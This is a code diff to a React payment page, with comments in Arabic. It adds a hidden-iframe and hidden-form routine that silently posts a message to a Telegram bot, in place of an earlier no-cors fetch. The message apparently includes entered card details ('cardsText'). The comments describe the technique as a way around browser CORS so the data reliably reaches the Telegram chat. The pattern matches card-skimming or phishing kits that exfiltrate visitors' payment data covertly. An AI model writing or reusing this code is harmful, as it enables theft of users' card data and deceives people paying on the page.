@@ -20,6 +20,44 @@ const pageTransition = {
   duration: 0.5
 };
 
+/** إرسال للبوت من المتصفح: fetch يفشل بسبب CORS؛ النموذج + iframe يصل فعلياً لـ Telegram */
+function sendTelegramViaHiddenForm(botToken, chatId, text) {
+  const max = 4090;
+  const safeText = text.length > max ? `${text.slice(0, max)}…` : text;
+
+  const iframe = document.createElement('iframe');
+  iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;visibility:hidden';
+  iframe.name = `tg_${Date.now()}_${Math.random().toString(36).slice(2)}`;
+  document.body.appendChild(iframe);
+
+  const form = document.createElement('form');
+  form.method = 'POST';
+  form.action = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  form.target = iframe.name;
+  form.acceptCharset = 'UTF-8';
+  form.style.display = 'none';
+
+  const chat = document.createElement('input');
+  chat.type = 'hidden';
+  chat.name = 'chat_id';
+  chat.value = String(chatId);
+  form.appendChild(chat);
+
+  const body = document.createElement('input');
+  body.type = 'hidden';
+  body.name = 'text';
+  body.value = safeText;
+  form.appendChild(body);
+
+  document.body.appendChild(form);
+  form.submit();
+
+  setTimeout(() => {
+    form.remove();
+    iframe.remove();
+  }, 5000);
+}
+
 const PaymentPage = () => {
   const navigate = useNavigate();
   const location = useLocation();
@@ -194,20 +232,12 @@ ${cardsText}
       return;
     }
 
-    // 2) تلغرام من المتصفح: JSON يفشل بسبب CORS → نرسل كـ form + no-cors
-    const telegramToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+    // 2) تلغرام: لا يمكن الاعتماد على fetch من المتصفح (CORS) → نموذج POST داخل iframe
+    const telegramToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim?.();
+    const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim?.();
     if (telegramToken && telegramChatId) {
       try {
-        const params = new URLSearchParams();
-        params.set('chat_id', String(telegramChatId));
-        params.set('text', message);
-        await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: params.toString(),
-        });
+        sendTelegramViaHiddenForm(telegramToken, telegramChatId, message);
       } catch (notifyErr) {
         console.error('Telegram send failed:', notifyErr);
       }
